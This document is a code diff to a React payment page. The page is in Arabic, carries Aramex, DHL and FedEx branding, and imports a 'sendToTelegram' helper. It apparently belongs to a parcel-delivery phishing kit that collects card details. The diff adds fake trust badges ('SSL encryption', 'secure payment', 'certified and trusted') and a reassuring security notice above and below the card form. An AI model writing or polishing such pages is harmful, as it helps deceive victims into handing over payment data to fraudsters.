@@ -13,7 +13,7 @@ import { getCompanyMeta } from "@/utils/companyMeta";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
-import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
+import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, Lock, CheckCircle } from "lucide-react";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -212,7 +212,7 @@ const PaymentRecipient = () => {
         <meta name="twitter:image" content={dynamicImage} />
       </Helmet>
       <div 
-        className="min-h-screen bg-background" 
+        className="min-h-screen bg-gray-50" 
         dir="rtl"
       >
         {/* Hero Section */}
@@ -249,6 +249,22 @@ const PaymentRecipient = () => {
 
         <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
           <div className="max-w-2xl mx-auto">
+            
+            {/* Security Badges */}
+            <div className="mb-6 flex items-center justify-center gap-4 flex-wrap">
+              <div className="flex items-center gap-2 bg-white px-4 py-2 rounded-lg shadow-sm">
+                <Shield className="w-4 h-4 text-green-600" />
+                <span className="text-sm text-gray-700">تشفير SSL</span>
+              </div>
+              <div className="flex items-center gap-2 bg-white px-4 py-2 rounded-lg shadow-sm">
+                <Lock className="w-4 h-4 text-green-600" />
+                <span className="text-sm text-gray-700">دفع آمن</span>
+              </div>
+              <div className="flex items-center gap-2 bg-white px-4 py-2 rounded-lg shadow-sm">
+                <CheckCircle className="w-4 h-4 text-green-600" />
+                <span className="text-sm text-gray-700">معتمد وموثوق</span>
+              </div>
+            </div>
             
             <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
               <form onSubmit={handleProceed}>
@@ -347,6 +363,17 @@ const PaymentRecipient = () => {
                   بالمتابعة، أنت توافق على الشروط والأحكام
                 </p>
               </form>
+              
+              {/* Security Notice */}
+              <div className="mt-6 p-4 rounded-lg bg-green-50 border border-green-200">
+                <div className="flex items-center gap-3">
+                  <Shield className="w-5 h-5 text-green-600" />
+                  <div>
+                    <p className="text-sm font-semibold text-green-800">دفع آمن ومشفر</p>
+                    <p className="text-xs text-green-700">معلوماتك محمية بأعلى معايير الأمان</p>
+                  </div>
+                </div>
+              </div>
               
               {/* Hidden Netlify Form */}
               <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
